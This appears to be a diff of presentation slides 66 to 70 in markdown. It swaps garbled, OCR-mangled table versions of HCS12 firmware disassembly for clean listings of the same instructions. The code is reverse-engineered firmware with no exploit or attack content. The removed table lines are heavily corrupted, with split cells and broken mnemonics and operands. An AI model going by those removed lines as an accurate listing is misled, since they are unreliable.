+E99F89: 042114        dbne    b,loc_E99FA0; Decrement counter and branch if != 0
+E99F8C: F62029        ldab    byte_2029; Load B
+E99F8F: 260A          bne     loc_E99F9B; Branch if not equal
+E99F91: E688          ldab    0xC+var_4,sp; Load B
+E99F93: 042105        dbne    b,loc_E99F9B; Decrement counter and branch if != 0
+E99F96: C614          ldab    #0x14; Load B
+E99F98: 7B201F        stab    byte_201F; Store B
+E99F9B: C614          ldab    #0x14; Load B
+E99F9D: 7B2028        stab    byte_2028; Store B
+E99FA0: F6201F        ldab    byte_201F; Load B
+E99FA3: C164          cmpb    #0x64 ; 'd'; Compare B to memory
+E99FA5: 2505          bcs     loc_E99FAC; Branch if carry set
+E99FA7: 79201F        clr     byte_201F; Clear memory
+E99FAA: 2004          bra     loc_E99FB0; Branch always
+E99FAC: 52            incb; Increment B
+E99FAD: 7B201F        stab    byte_201F; Store B
+E99FB0: F63DF5        ldab    byte_3DF5; Load B
+E99FB3: 04210F        dbne    b,loc_E99FC5; Decrement counter and branch if != 0
+E99FB6: E689          ldab    0xC+var_3,sp; Load B
+E99FB8: 04210A        dbne    b,loc_E99FC5; Decrement counter and branch if != 0
+E99FBB: F6202A        ldab    byte_202A; Load B
+E99FBE: 2605          bne     loc_E99FC5; Branch if not equal
+E99FC0: C605          ldab    #5; Load B
+E99FC2: 7B201F        stab    byte_201F; Store B
+E99FC5: E688          ldab    0xC+var_4,sp; Load B
+E99FC7: 2604          bne     loc_E99FCD; Branch if not equal
+E99FC9: C6C8          ldab    #0xC8; Load B
+```
 
 ## Slide 67
 
-|**E99FCB:**
-**E99FCD:**|2026
-F62020|**bra**
-**ldab**|loc_E99FF3_; Branch always_
-bte2020_;LoadB_|
-|---|---|---|---|
-|
-**E99FD0:**|
- C164|**cmpb**|y  _
-#0x64 _; 'd'; Compare B to memory_|
-|**E99FD2:**|2303|**bls**|loc_E99FD7_; Branch if lower or same_|
-|**E99FD4:**|53|decb_; _|_Decrement B_|
-|**E99FD5:**|201C|**bra**|loc_E99FF3_; Branch always_|
-|**E99FD7:**|2519|**bcs**|loc_E99FF2_; Branch if carry set_|
-|**E99FD9:**|C664|**ldab**|#0x64 _; 'd'; Load B_|
-|**E99FDB:**|7B2020|**stab**|byte_2020_; Store B_|
-|**E99FDE:**|ECF026|**ldd**|0xC+arg_18,**sp**_; Load D_|
-|**E99FE1:**|8C0052|**cpd**|#0x52 _; 'R'; Compare D to memory (16-bit)_|
-|**E99FE4:**|2210|**bhi**|loc_E99FF6_; Branch if higher_|
-|**E99FE6:**|FC201D|**ldd**|word_201D_; Load D_|
-|**E99FE9:**|8C0052|**cpd**|#0x52 _; 'R'; Compare D to memory (16-bit)_|
-|**E99FEC:**|2308|**bls**|loc_E99FF6_; Branch if lower or same_|
-|**E99FEE:**|C614|**ldab**|#0x14_; Load B_|
-|**E99FF0:**|2001|**bra**|loc_E99FF3_; Branch always_|
-|**E99FF2:**|52|incb_; _|_Increment B_|
-|**E99FF3:**|7B2020|**stab**|byte_2020_; Store B_|
-|**E99FF6:**|F63DF6|**ldab**|byte3DF6_; Load B_|
-|**E99FF9:**|042149|**dbne**|_
-b,loc_E9A045_; Decrement counter and branch if != 0_|
-|**E99FFC:**|E6F022|**ldab**|0xC+arg_14,**sp**_; Load B_|
-|**E99FFF:**|37|**pshb**_; _|_Push B_|
-|**E9A000:**|E6F022|**ldab**|0xD+arg_13,**sp**_; Load B_|
-|**E9A003:**|37|**pshb**_; _|_Push B_|
-|**E9A004:**|EC8C|**ldd**|0xE+var_2,**sp**_; Load D_|
-|**E9A006:**|3B|**pshd**_; _|_Push D_|
-|**E9A007:**|E689|**ldab**|0x10+var_7,**sp**_; Load B_|
-|**E9A009:**|37|**pshb**_;_|_PushB_|
-|
-**E9A00A:**|
- E68E|
-**ldab**|
-0x11+var_3,**sp**_; Load B_|
-|**E9A00C:**|37|**pshb**_; _|_Push B_|
-|**E9A00D:**|ECF019|**ldd**|0x12+arg_5,**sp**_; Load D_|
-|**E9A010:**|3B|**pshd**_; _|_Push D_|
-|**E9A011:**|C60A|**ldab**|#0xA_; Load B_|
-|**E9A013:**|37|**pshb**_; _|_Push B_|
-|**E9A014:**|ECF30009|**ldd**|[9,**sp**]_; Load D_|
-|**E9A018:**|4AA288E9|**call**|core_E9A288,#0xE9_; Call subroutine in expanded memory_|
-|**E9A01C:**|1B89|**leas**|9,**sp**_; Load effective address into SP_|
-|**E9A01E:**|7B2025|**stab**|word2025_; Store B_|
-|**E9A021:**|E6F022|**ldab**|_
-0xC+arg_14,**sp**_; Load B_|
-|**E9A024:**|37|**pshb**_; _|_Push B_|
-|**E9A025:**|E6F022|**ldab**|0xD+arg_13,**sp**_; Load B_|
-|**E9A028:**|37|**pshb**_; _|_Push B_|
-|**E9A029:**|EC8C|**ldd**|0xE+var_2,**sp**_; Load D_|
-|**E9A02B:**|3B|**pshd**_; _|_Push D_|
-|**E9A02C:**|E689|**ldab**|0x10+var_7,**sp**_; Load B_|
-|**E9A02E:**|37|**pshb**_; _|_Push B_|
-|**E9A02F:**|E68E|**ldab**|0x11+var_3,**sp**_; Load B_|
-|**E9A031:**|37|**pshb**_; _|_Push B_|
-|**E9A032:**|ECF01B|**ldd**|0x12+arg7,**sp**_; Load D_|
-|**E9A035:**|3B|**pshd**_; _|_
- _Push D_|
-|**E9A036:**|C60A|**ldab**|#0xA_; Load B_|
-|**E9A038:**|37|**pshb**_; _|_Push B_|
-|**E9A039:**|ED89|**ldy**|0x15+var_C,**sp**_; Load Y_|
-|**E9A03B:**|EC42|**ldd**|2,y_; Load D_|
-|**E9A03D:**|4AA288E9|**call**|core_E9A288,#0xE9_; Call subroutine in expanded memory_|
-|**E9A041:**|1B89|**leas**|9,**sp**_; Load effective address into SP_|
-|**E9A043:**|2059|**bra**|locE9A09E_;Branchalways_|
-|
-**E9A045:**|
- E6F028|**ldab**|_
-0xC+arg_1A,**sp**_; Load B_|
-
-67
+```
+E99FCB: 2026          bra     loc_E99FF3; Branch always
+E99FCD: F62020        ldab    byte_2020; Load B
+E99FD0: C164          cmpb    #0x64 ; 'd'; Compare B to memory
+E99FD2: 2303          bls     loc_E99FD7; Branch if lower or same
+E99FD4: 53            decb; Decrement B
+E99FD5: 201C          bra     loc_E99FF3; Branch always
+E99FD7: 2519          bcs     loc_E99FF2; Branch if carry set
+E99FD9: C664          ldab    #0x64 ; 'd'; Load B
+E99FDB: 7B2020        stab    byte_2020; Store B
+E99FDE: ECF026        ldd     0xC+arg_18,sp; Load D
+E99FE1: 8C0052        cpd     #0x52 ; 'R'; Compare D to memory (16-bit)
+E99FE4: 2210          bhi     loc_E99FF6; Branch if higher
+E99FE6: FC201D        ldd     word_201D; Load D
+E99FE9: 8C0052        cpd     #0x52 ; 'R'; Compare D to memory (16-bit)
+E99FEC: 2308          bls     loc_E99FF6; Branch if lower or same
+E99FEE: C614          ldab    #0x14; Load B
+E99FF0: 2001          bra     loc_E99FF3; Branch always
+E99FF2: 52            incb; Increment B
+E99FF3: 7B2020        stab    byte_2020; Store B
+E99FF6: F63DF6        ldab    byte_3DF6; Load B
+E99FF9: 042149        dbne    b,loc_E9A045; Decrement counter and branch if != 0
+E99FFC: E6F022        ldab    0xC+arg_14,sp; Load B
+E99FFF: 37            pshb; Push B
+E9A000: E6F022        ldab    0xD+arg_13,sp; Load B
+E9A003: 37            pshb; Push B
+E9A004: EC8C          ldd     0xE+var_2,sp; Load D
+E9A006: 3B            pshd; Push D
+E9A007: E689          ldab    0x10+var_7,sp; Load B
+E9A009: 37            pshb; Push B
+E9A00A: E68E          ldab    0x11+var_3,sp; Load B
+E9A00C: 37            pshb; Push B
+E9A00D: ECF019        ldd     0x12+arg_5,sp; Load D
+E9A010: 3B            pshd; Push D
+E9A011: C60A          ldab    #0xA; Load B
+E9A013: 37            pshb; Push B
+E9A014: ECF30009      ldd     [9,sp]; Load D
+E9A018: 4AA288E9      call    core_E9A288,#0xE9; Call subroutine in expanded memory
+E9A01C: 1B89          leas    9,sp; Load effective address into SP
+E9A01E: 7B2025        stab    word_2025; Store B
+E9A021: E6F022        ldab    0xC+arg_14,sp; Load B
+E9A024: 37            pshb; Push B
+E9A025: E6F022        ldab    0xD+arg_13,sp; Load B
+E9A028: 37            pshb; Push B
+E9A029: EC8C          ldd     0xE+var_2,sp; Load D
+E9A02B: 3B            pshd; Push D
+E9A02C: E689          ldab    0x10+var_7,sp; Load B
+E9A02E: 37            pshb; Push B
+E9A02F: E68E          ldab    0x11+var_3,sp; Load B
+E9A031: 37            pshb; Push B
+E9A032: ECF01B        ldd     0x12+arg_7,sp; Load D
+E9A035: 3B            pshd; Push D
+E9A036: C60A          ldab    #0xA; Load B
+E9A038: 37            pshb; Push B
+E9A039: ED89          ldy     0x15+var_C,sp; Load Y
+E9A03B: EC42          ldd     2,y; Load D
+E9A03D: 4AA288E9      call    core_E9A288,#0xE9; Call subroutine in expanded memory
+E9A041: 1B89          leas    9,sp; Load effective address into SP
+E9A043: 2059          bra     loc_E9A09E; Branch always
+E9A045: E6F028        ldab    0xC+arg_1A,sp; Load B
+```
 
 ## Slide 68
 
-|**E9A048:**
-**E9A049:**|37
-E6F026|**pshb**_; _
-**ldab**|_Push B_
-0xD+ar17**s**_LoadB_|
-|---|---|---|---|
-|
-**E9A04C:**|
- 37|**pshb**_; _|g_,**p**_;  _
- _Push B_|
-|**E9A04D:**|E6F024|**ldab**|0xE+arg_14,**sp**_; Load B_|
-|**E9A050:**|37|**pshb**_; _|_Push B_|
-|**E9A051:**|E6F024|**ldab**|0xF+arg_13,**sp**_; Load B_|
-|**E9A054:**|37|**pshb**_; _|_Push B_|
-|**E9A055:**|EC8E|**ldd**|0x10+var_2,**sp**_; Load D_|
-|**E9A057:**|3B|**pshd**_; _|_Push D_|
-|**E9A058:**|E68B|**ldab**|0x12+var_7,**sp**_; Load B_|
-|**E9A05A:**|37|**pshb**_; _|_Push B_|
-|**E9A05B:**|E6F010|**ldab**|0x13+var_3,**sp**_; Load B_|
-|**E9A05E:**|37|**shb**_;_|_PushB_|
-|
-**E9A05F:**|
- ECF01B|**p**
-**ldd**|
-0x14+arg_5,**sp**_; Load D_|
-|**E9A062:**|3B|**pshd**_; _|_Push D_|
-|**E9A063:**|C60A|**ldab**|#0xA_; Load B_|
-|**E9A065:**|37|**pshb**_; _|_Push B_|
-|**E9A066:**|ECF3000B|**ldd**|[0xB,**sp**]_; Load D_|
-|**E9A06A:**|4AA333E9|**call**|core_E9A333,#0xE9_; Call subroutine in expanded memory_|
-|**E9A06E:**|1B8B|**leas**|0xB,**sp**_; Load effective address into SP_|
-|**E9A070:**|7B2025|**stab**|word_2025_; Store B_|
-|**E9A073:**|E6F028|**ldab**|0xC+arg_1A,**sp**_; Load B_|
-|**E9A076:**|37|**pshb**_; _|_Push B_|
-|**E9A077:**|E6F026|**ldab**|0xD+arg_17,**sp**_; Load B_|
-|**E9A07A:**|37|**pshb**_; _|_Push B_|
-|**E9A07B:**|E6F024|**ldab**|0xE+arg_14,**sp**_; Load B_|
-|**E9A07E:**|37|**pshb**_; _|_Push B_|
-|**E9A07F:**|E6F024|**ldab**|0xF+arg_13,**sp**_; Load B_|
-|**E9A082:**|37|**pshb**_;_|_PushB_|
-|
-**E9A083:**|
- EC8E|
-**ldd**|
-0x10+var2,**sp**_; Load D_|
-|**E9A085:**|3B|**pshd**_; _|_
- _Push D_|
-|**E9A086:**|E68B|**ldab**|0x12+var_7,**sp**_; Load B_|
-|**E9A088:**|37|**pshb**_; _|_Push B_|
-|**E9A089:**|E6F010|**ldab**|0x13+var_3,**sp**_; Load B_|
-|**E9A08C:**|37|**pshb**_; _|_Push B_|
-|**E9A08D:**|ECF01D|**ldd**|0x14+arg_7,**sp**_; Load D_|
-|**E9A090:**|3B|**pshd**_; _|_Push D_|
-|**E9A091:**|C60A|**ldab**|#0xA_; Load B_|
-|**E9A093:**|37|**pshb**_; _|_Push B_|
-|**E9A094:**|ED8B|**ldy**|0x17+var_C,**sp**_; Load Y_|
-|**E9A096:**|EC42|**ldd**|2,y_; Load D_|
-|**E9A098:**|4AA333E9|**call**|core_E9A333,#0xE9_; Call subroutine in expanded memory_|
-|**E9A09C:**|1B8B|**leas**|0xB,**sp**_; Load effective address into SP_|
-|**E9A09E:**|7B2026|**stab**|word_2025+1_; Store B_|
-|**E9A0A1:**|F63DE3|**ldab**|byte_3DE3_; Load B_|
-|**E9A0A4:**|042149|**dbne**|b,loc_E9A0F0_; Decrement counter and branch if != 0_|
-|**E9A0A7:**|E6F023|**ldab**|0xC+arg_15,**sp**_; Load B_|
-|**E9A0AA:**|37|**pshb**_; _|_Push B_|
-|**E9A0AB:**|E6F022|**ldab**|0xD+arg13,**sp**_; Load B_|
-|**E9A0AE:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A0AF:**|EC8E|**ldd**|0xE**s**_LoadD_|
-|
-**E9A0B1:**|
- 3B|**pshd**_; _|,**p**_;  _
- _Push D_|
-|**E9A0B2:**|E68A|**ldab**|0x10+var6,**sp**_; Load B_|
-|**E9A0B4:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A0B5:**|E68D|**ldab**|0x11+var_4,**sp**_; Load B_|
-|**E9A0B7:**|37|**pshb**_; _|_Push B_|
-|**E9A0B8:**|ECF01D|**ldd**|0x12+arg_9,**sp**_; Load D_|
-|**E9A0BB:**|3B|**pshd**_;_|_PushD_|
-|
-**E9A0BC:**|
- C614|
-**ldab**|
-#0x14_; Load B_|
-
-68
+```
+E9A048: 37            pshb; Push B
+E9A049: E6F026        ldab    0xD+arg_17,sp; Load B
+E9A04C: 37            pshb; Push B
+E9A04D: E6F024        ldab    0xE+arg_14,sp; Load B
+E9A050: 37            pshb; Push B
+E9A051: E6F024        ldab    0xF+arg_13,sp; Load B
+E9A054: 37            pshb; Push B
+E9A055: EC8E          ldd     0x10+var_2,sp; Load D
+E9A057: 3B            pshd; Push D
+E9A058: E68B          ldab    0x12+var_7,sp; Load B
+E9A05A: 37            pshb; Push B
+E9A05B: E6F010        ldab    0x13+var_3,sp; Load B
+E9A05E: 37            pshb; Push B
+E9A05F: ECF01B        ldd     0x14+arg_5,sp; Load D
+E9A062: 3B            pshd; Push D
+E9A063: C60A          ldab    #0xA; Load B
+E9A065: 37            pshb; Push B
+E9A066: ECF3000B      ldd     [0xB,sp]; Load D
+E9A06A: 4AA333E9      call    core_E9A333,#0xE9; Call subroutine in expanded memory
+E9A06E: 1B8B          leas    0xB,sp; Load effective address into SP
+E9A070: 7B2025        stab    word_2025; Store B
+E9A073: E6F028        ldab    0xC+arg_1A,sp; Load B
+E9A076: 37            pshb; Push B
+E9A077: E6F026        ldab    0xD+arg_17,sp; Load B
+E9A07A: 37            pshb; Push B
+E9A07B: E6F024        ldab    0xE+arg_14,sp; Load B
+E9A07E: 37            pshb; Push B
+E9A07F: E6F024        ldab    0xF+arg_13,sp; Load B
+E9A082: 37            pshb; Push B
+E9A083: EC8E          ldd     0x10+var_2,sp; Load D
+E9A085: 3B            pshd; Push D
+E9A086: E68B          ldab    0x12+var_7,sp; Load B
+E9A088: 37            pshb; Push B
+E9A089: E6F010        ldab    0x13+var_3,sp; Load B
+E9A08C: 37            pshb; Push B
+E9A08D: ECF01D        ldd     0x14+arg_7,sp; Load D
+E9A090: 3B            pshd; Push D
+E9A091: C60A          ldab    #0xA; Load B
+E9A093: 37            pshb; Push B
+E9A094: ED8B          ldy     0x17+var_C,sp; Load Y
+E9A096: EC42          ldd     2,y; Load D
+E9A098: 4AA333E9      call    core_E9A333,#0xE9; Call subroutine in expanded memory
+E9A09C: 1B8B          leas    0xB,sp; Load effective address into SP
+E9A09E: 7B2026        stab    word_2025+1; Store B
+E9A0A1: F63DE3        ldab    byte_3DE3; Load B
+E9A0A4: 042149        dbne    b,loc_E9A0F0; Decrement counter and branch if != 0
+E9A0A7: E6F023        ldab    0xC+arg_15,sp; Load B
+E9A0AA: 37            pshb; Push B
+E9A0AB: E6F022        ldab    0xD+arg_13,sp; Load B
+E9A0AE: 37            pshb; Push B
+E9A0AF: EC8E          ldd     0xE,sp; Load D
+E9A0B1: 3B            pshd; Push D
+E9A0B2: E68A          ldab    0x10+var_6,sp; Load B
+E9A0B4: 37            pshb; Push B
+E9A0B5: E68D          ldab    0x11+var_4,sp; Load B
+E9A0B7: 37            pshb; Push B
+E9A0B8: ECF01D        ldd     0x12+arg_9,sp; Load D
+E9A0BB: 3B            pshd; Push D
+E9A0BC: C614          ldab    #0x14; Load B
+```
 
 ## Slide 69
 
-|**E9A0BE:**
-**E9A0BF:**|37
-ED89|**pshb**_; _
-**ld**|_Push B_
-0x15+varC**s**_LoadY_|
-|---|---|---|---|
-|
-**E9A0C1:**|
- EC44|**y**
-**ldd**|_,**p**_;  _
-4,y_; Load D_|
-|**E9A0C3:**|4AA288E9|**call**|core_E9A288,#0xE9_; Call subroutine in expanded memory_|
-|**E9A0C7:**|1B89|**leas**|9,**sp**_; Load effective address into SP_|
-|**E9A0C9:**|7B2023|**stab**|word_2023_; Store B_|
-|**E9A0CC:**
-|E6F023
-|**ldab**
-|0xC+arg_15,**sp**_; Load B_
-|
-|**E9A0CF:**
-**E9A0D0:**|37
- E6F022|**pshb**_; _
-**ldab**|_Push B_
-0xD+arg_13,**sp**_; Load B_|
-|**E9A0D3:**|37|**pshb**_;_|_PushB_|
-|
-**E9A0D4:**|
- EC8E|
-**ldd**|
-0xE,**sp**_; Load D_|
-|**E9A0D6:**|3B|**pshd**_; _|_Push D_|
-|**E9A0D7:**|E68A|**ldab**|0x10+var_6,**sp**_; Load B_|
-|**E9A0D9:**|37|**pshb**_; _|_Push B_|
-|**E9A0DA:**|E68D|**ldab**|0x11+var_4,**sp**_; Load B_|
-|**E9A0DC:**|37|**pshb**_; _|_Push B_|
-|**E9A0DD:**|ECF01F|**ldd**|0x12+arg_A+1,**sp**_; Load D_|
-|**E9A0E0:**|3B|**pshd**_; _|_Push D_|
-|**E9A0E1:**|C614|**ldab**|#0x14_; Load B_|
-|**E9A0E3:**|37|**pshb**_; _|_Push B_|
-|**E9A0E4:**|ED89|**ldy**|0x15+var_C,**sp**_; Load Y_|
-|**E9A0E6:**|EC46|**ldd**|6,y_; Load D_|
-|**E9A0E8:**|4AA288E9|**call**|core_E9A288,#0xE9_; Call subroutine in expanded memory_|
-|**E9A0EC:**|1B89|**leas**|9,**sp**_; Load effective address into SP_|
-|**E9A0EE:**|2055|**bra**|loc_E9A145_; Branch always_|
-|**E9A0F0:**|E6F028|**ldab**|0xC+arg1A,**sp**_; Load B_|
-|**E9A0F3:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A0F4:**|C7|clrb_; _|_Clear B_|
-|**E9A0F5:**|37|**pshb**_; _|_Push B_|
-|**E9A0F6:**|E6F025|**ldab**|0xE+arg15,**sp**_; Load B_|
-|**E9A0F9:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A0FA:**|E6F024|**ldab**|0xF+arg_13,**sp**_; Load B_|
-|**E9A0FD:**|37|**pshb**_; _|_Push B_|
-|**E9A0FE:**|ECF010|**ldd**|0x10,**sp**_; Load D_|
-|**E9A101:**|3B|**pshd**_; _|_Push D_|
-|**E9A102:**|E68C|**ldab**|0x12+var_6,**sp**_; Load B_|
-|**E9A104:**|37|**pshb**_; _|_Push B_|
-|**E9A105:**|E68F|**ldab**|0x13+var_4,**sp**_; Load B_|
-|**E9A107:**|37|**pshb**_; _|_Push B_|
-|**E9A108:**|ECF01F|**ldd**|0x14+arg_9,**sp**_; Load D_|
-|**E9A10B:**|3B|**pshd**_; _|_Push D_|
-|**E9A10C:**|C614|**ldab**|#0x14_; Load B_|
-|**E9A10E:**|37|**pshb**_; _|_Push B_|
-|**E9A10F:**|ED8B|**ldy**|0x17+var_C,**sp**_; Load Y_|
-|**E9A111:**|EC44|**ldd**|4,y_; Load D_|
-|**E9A113:**|4AA333E9|**call**|core_E9A333,#0xE9_; Call subroutine in expanded memory_|
-|**E9A117:**|1B8B|**leas**|0xB,**sp**_; Load effective address into SP_|
-|**E9A119:**|7B2023|**stab**|word_2023_; Store B_|
-|**E9A11C:**|E6F028|**ldab**|0xC+arg_1A,**sp**_; Load B_|
-|**E9A11F:**|37|**pshb**_; _|_Push B_|
-|**E9A120:**|C7|clrb|_ClearB_|
-|
-**E9A121:**|
-37|_; _
-**pshb**_;_|
-_PushB_|
-|
-**E9A122:**|
- E6F025|
-**ldab**|
-0xE+arg15,**sp**_; Load B_|
-|**E9A125:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A126:**|E6F024|**ldab**|0xF+arg_13,**sp**_; Load B_|
-|**E9A129:**|37|**pshb**_; _|_Push B_|
-|**E9A12A:**|ECF010|**ldd**|0x10,**sp**_; Load D_|
-|**E9A12D:**|3B|**pshd**_;_|_PushD_|
-|
-**E9A12E:**|
- E68C|
-**ldab**|
-0x12+var_6,**sp**_; Load B_|
-
-69
+```
+E9A0BE: 37            pshb; Push B
+E9A0BF: ED89          ldy     0x15+var_C,sp; Load Y
+E9A0C1: EC44          ldd     4,y; Load D
+E9A0C3: 4AA288E9      call    core_E9A288,#0xE9; Call subroutine in expanded memory
+E9A0C7: 1B89          leas    9,sp; Load effective address into SP
+E9A0C9: 7B2023        stab    word_2023; Store B
+E9A0CC: E6F023        ldab    0xC+arg_15,sp; Load B
+E9A0CF: 37            pshb; Push B
+E9A0D0: E6F022        ldab    0xD+arg_13,sp; Load B
+E9A0D3: 37            pshb; Push B
+E9A0D4: EC8E          ldd     0xE,sp; Load D
+E9A0D6: 3B            pshd; Push D
+E9A0D7: E68A          ldab    0x10+var_6,sp; Load B
+E9A0D9: 37            pshb; Push B
+E9A0DA: E68D          ldab    0x11+var_4,sp; Load B
+E9A0DC: 37            pshb; Push B
+E9A0DD: ECF01F        ldd     0x12+arg_A+1,sp; Load D
+E9A0E0: 3B            pshd; Push D
+E9A0E1: C614          ldab    #0x14; Load B
+E9A0E3: 37            pshb; Push B
+E9A0E4: ED89          ldy     0x15+var_C,sp; Load Y
+E9A0E6: EC46          ldd     6,y; Load D
+E9A0E8: 4AA288E9      call    core_E9A288,#0xE9; Call subroutine in expanded memory
+E9A0EC: 1B89          leas    9,sp; Load effective address into SP
+E9A0EE: 2055          bra     loc_E9A145; Branch always
+E9A0F0: E6F028        ldab    0xC+arg_1A,sp; Load B
+E9A0F3: 37            pshb; Push B
+E9A0F4: C7            clrb; Clear B
+E9A0F5: 37            pshb; Push B
+E9A0F6: E6F025        ldab    0xE+arg_15,sp; Load B
+E9A0F9: 37            pshb; Push B
+E9A0FA: E6F024        ldab    0xF+arg_13,sp; Load B
+E9A0FD: 37            pshb; Push B
+E9A0FE: ECF010        ldd     0x10,sp; Load D
+E9A101: 3B            pshd; Push D
+E9A102: E68C          ldab    0x12+var_6,sp; Load B
+E9A104: 37            pshb; Push B
+E9A105: E68F          ldab    0x13+var_4,sp; Load B
+E9A107: 37            pshb; Push B
+E9A108: ECF01F        ldd     0x14+arg_9,sp; Load D
+E9A10B: 3B            pshd; Push D
+E9A10C: C614          ldab    #0x14; Load B
+E9A10E: 37            pshb; Push B
+E9A10F: ED8B          ldy     0x17+var_C,sp; Load Y
+E9A111: EC44          ldd     4,y; Load D
+E9A113: 4AA333E9      call    core_E9A333,#0xE9; Call subroutine in expanded memory
+E9A117: 1B8B          leas    0xB,sp; Load effective address into SP
+E9A119: 7B2023        stab    word_2023; Store B
+E9A11C: E6F028        ldab    0xC+arg_1A,sp; Load B
+E9A11F: 37            pshb; Push B
+E9A120: C7            clrb; Clear B
+E9A121: 37            pshb; Push B
+E9A122: E6F025        ldab    0xE+arg_15,sp; Load B
+E9A125: 37            pshb; Push B
+E9A126: E6F024        ldab    0xF+arg_13,sp; Load B
+E9A129: 37            pshb; Push B
+E9A12A: ECF010        ldd     0x10,sp; Load D
+E9A12D: 3B            pshd; Push D
+E9A12E: E68C          ldab    0x12+var_6,sp; Load B
+```
 
 ## Slide 70
 
-|**E9A130:**
-**E9A131:**|37
-E68F|**pshb**_; _
-**ldab**|_Push B_
-0x13+var4**s**_LoadB_|
-|---|---|---|---|
-|
-**E9A133:**|
- 37|**pshb**_; _|_,**p**_;  _
- _Push B_|
-|**E9A134:**|ECF021|**ldd**|0x14+arg_A+1,**sp**_; Load D_|
-|**E9A137:**|3B|**pshd**_; _|_Push D_|
-|**E9A138:**|C614|**ldab**|#0x14_; Load B_|
-|**E9A13A:**|37|**pshb**_; _|_Push B_|
-|**E9A13B:**|ED8B|**ldy**|0x17+var_C,**sp**_; Load Y_|
-|**E9A13D:**|EC46|**ldd**|6,y_; Load D_|
-|**E9A13F:**|4AA333E9|**call**|core_E9A333,#0xE9_; Call subroutine in expanded memory_|
-|**E9A143:**|1B8B|**leas**|0xB,**sp**_; Load effective address into SP_|
-|**E9A145:**|7B2024|**stab**|word_2023+1_; Store B_|
-|**E9A148:**|F63DE4|**ldab**|byte_3DE4_; Load B_|
-|**E9A14B:**|042147|**dbne**|b,loc_E9A195_; Decrement counter and branch if != 0_|
-|**E9A14E:**|E6F028|**ldab**|0xC+arg_1A,**sp**_; Load B_|
-|**E9A151:**|37|**pshb**_; _|_Push B_|
-|**E9A152:**|C7|clrb_; _|_Clear B_|
-|**E9A153:**|37|**pshb**_; _|_Push B_|
-|**E9A154:**|E6F025|**ldab**|0xE+arg_15,**sp**_; Load B_|
-|**E9A157:**|37|**pshb**_; _|_Push B_|
-|**E9A158:**|E6F024|**ldab**|0xF+arg_13,**sp**_; Load B_|
-|**E9A15B:**|37|**pshb**_; _|_Push B_|
-|**E9A15C:**|EC8E|**ldd**|0x10+var_2,**sp**_; Load D_|
-|**E9A15E:**|3B|**pshd**_; _|_Push D_|
-|**E9A15F:**|E68D|**ldab**|0x12+var5,**sp**_; Load B_|
-|**E9A161:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A162:**|E6F010|**ldab**|0x13+var_3,**sp**_; Load B_|
-|**E9A165:**|37|**pshb**_; _|_Push B_|
-|**E9A166:**|ECF023|**ldd**|0x14+arg_D,**sp**_; Load D_|
-|**E9A169:**|3B|**pshd**_; _|_Push D_|
-|**E9A16A:**|F62028|**ldab**|byte_2028_; Load B_|
-|**E9A16D:**|37|**pshb**_; _|_Push B_|
-|**E9A16E:**|ED8B|**ldy**|0x17+var_C,**sp**_; Load Y_|
-|**E9A170:**|EC48|**ldd**|8,y_; Load D_|
-|**E9A172:**|4AA333E9|**call**|core_E9A333,#0xE9_; Call subroutine in expanded memory_|
-|**E9A176:**|1B8B|**leas**|0xB,**sp**_; Load effective address into SP_|
-|**E9A178:**|7B2021|**stab**|word_2021_; Store B_|
-|**E9A17B:**|E6F028|**ldab**|0xC+arg_1A,**sp**_; Load B_|
-|**E9A17E:**|37|**pshb**_; _|_Push B_|
-|**E9A17F:**|C7|clrb_; _|_Clear B_|
-|**E9A180:**|37|**pshb**_; _|_Push B_|
-|**E9A181:**|E6F025|**ldab**|0xE+arg_15,**sp**_; Load B_|
-|**E9A184:**|37|**pshb**_; _|_Push B_|
-|**E9A185:**|E6F024|**ldab**|0xF+arg13,**sp**_; Load B_|
-|**E9A188:**|37|**pshb**_; _|_
- _Push B_|
-|**E9A189:**|EC8E|**ldd**|0x10+var_2,**sp**_; Load D_|
-|**E9A18B:**|3B|**pshd**_; _|_Push D_|
-|**E9A18C:**|E68D|**ldab**|0x12+var_5,**sp**_; Load B_|
-|**E9A18E:**|37|**pshb**_; _|_Push B_|
-|**E9A18F:**|E6F010|**ldab**|0x13+var3,**sp**_; Load B_|
-|**E9A192:**|06A223|**jm**|_
-locE9A223_JumAddress_|
-|
-**E9A195:**|
- F63E04|**p**
-**ldab**|; p _
-byte_3E04_; Load B_|
-|**E9A198:**|042146|**dbne**|b,loc_E9A1E1_; Decrement counter and branch if != 0_|
-|**E9A19B:**|E6F028|**ldab**|0x13+arg_13,**sp**_; Load B_|
-|**E9A19E:**|37|**pshb**_; _|_Push B_|
-|**E9A19F:**|C7|clrb_; _|_Clear B_|
-|**E9A1A0:**|37|**pshb**_; _|_Push B_|
-|**E9A1A1:**|E6F025|**ldab**|0x15+argE**sp**_;LoadB_|
-|
-**E9A1A4:**|
- 37|**pshb**_; _|_,
- _Push B_|
-
-70
+```
+E9A130: 37            pshb; Push B
+E9A131: E68F          ldab    0x13+var_4,sp; Load B
+E9A133: 37            pshb; Push B
+E9A134: ECF021        ldd     0x14+arg_A+1,sp; Load D
+E9A137: 3B            pshd; Push D
+E9A138: C614          ldab    #0x14; Load B
+E9A13A: 37            pshb; Push B
+E9A13B: ED8B          ldy     0x17+var_C,sp; Load Y
+E9A13D: EC46          ldd     6,y; Load D
+E9A13F: 4AA333E9      call    core_E9A333,#0xE9; Call subroutine in expanded memory
+E9A143: 1B8B          leas    0xB,sp; Load effective address into SP
+E9A145: 7B2024        stab    word_2023+1; Store B
+E9A148: F63DE4        ldab    byte_3DE4; Load B
+E9A14B: 042147        dbne    b,loc_E9A195; Decrement counter and branch if != 0
+E9A14E: E6F028        ldab    0xC+arg_1A,sp; Load B
+E9A151: 37            pshb; Push B
+E9A152: C7            clrb; Clear B
+E9A153: 37            pshb; Push B
+E9A154: E6F025        ldab    0xE+arg_15,sp; Load B
+E9A157: 37            pshb; Push B
+E9A158: E6F024        ldab    0xF+arg_13,sp; Load B
+E9A15B: 37            pshb; Push B
+E9A15C: EC8E          ldd     0x10+var_2,sp; Load D
+E9A15E: 3B            pshd; Push D
+E9A15F: E68D          ldab    0x12+var_5,sp; Load B
+E9A161: 37            pshb; Push B
+E9A162: E6F010        ldab    0x13+var_3,sp; Load B
+E9A165: 37            pshb; Push B
+E9A166: ECF023        ldd     0x14+arg_D,sp; Load D
